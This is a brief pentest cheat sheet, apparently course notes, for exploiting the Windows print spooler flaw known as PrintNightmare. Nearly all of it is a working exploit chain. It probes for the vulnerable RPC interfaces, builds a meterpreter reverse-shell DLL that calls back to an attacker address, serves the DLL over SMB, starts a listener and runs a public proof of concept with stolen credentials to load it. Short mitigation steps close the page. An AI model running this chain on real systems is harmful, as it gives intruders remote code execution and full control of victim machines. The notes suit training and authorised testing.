Check for vulnerability
```bash
rpcdump.py @192.168.1.129 | egrep 'MS-RPRN|MS-PAR'
netexec smb 192.168.170.175 -u adot -p eight -M printnightmare
```
Generate malicious DLL
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1337 -f dll > shell.dll

smbserver.py share `pwd` -smb2support

msfconsole -q -x 'use exploit/multi/handler;set LHOST tun0; set LPORT 443; run'
```
Download and run [POC](https://github.com/cube0x0/CVE-2021-1675).
```bash
python3 printnightmare.py pnpt.local/greg:Password1@192.168.1.129 '\\192.168.1.11\share\shell.dll'
```
Alternatively we can run this [POC](https://github.com/JohnHammond/CVE-2021-34527/tree/master/nightmare-dll/nightmare) locally 
```powershell
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```
### Mitigations
Run Stop-Service Spooler
` REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f`

Patch ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675))